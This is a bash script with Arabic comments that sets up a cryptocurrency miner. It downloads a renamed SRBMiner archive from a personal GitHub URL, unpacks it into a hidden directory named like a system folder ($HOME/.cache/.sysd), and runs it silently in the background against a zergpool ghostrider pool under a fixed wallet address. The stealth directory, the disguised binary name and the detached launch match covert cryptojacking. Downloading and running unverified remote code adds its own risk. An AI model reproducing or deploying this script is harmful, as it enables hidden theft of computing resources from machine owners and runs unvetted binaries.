#!/bin/bash

# إعداد بيانات المحفظة والمسبح
WALLET="NQjVj7UtqaYTiYrQ5nv5UDDaQXttxYZZxT"   # ← عدّلها لمحفظتك
WORKER="x" 
POOL="ghostrider.eu.mine.zergpool.com:5354"
ALGORITHM="ghostrider"
THREADS=

# مجلد عمل مخفي
WORKDIR="$HOME/.cache/.sysd"
mkdir -p "$WORKDIR" && cd "$WORKDIR"

# تحميل SRBMiner-MULTI (Linux x64)
wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz -O scala.tar.gz

# فك الضغط في المجلد المخفي
tar -xvf scala.tar.gz --strip=1
rm scala.tar.gz

# تشغيل المعدّن في الخلفية بنواة واحدة
nohup ./scala -a ghostrider --url ghostrider.eu.mine.zergpool.com:5354 --user NQjVj7UtqaYTiYrQ5nv5UDDaQXttxYZZxT -p c=XNA,mc=RTM  > cpu_output.log 2>&1 &
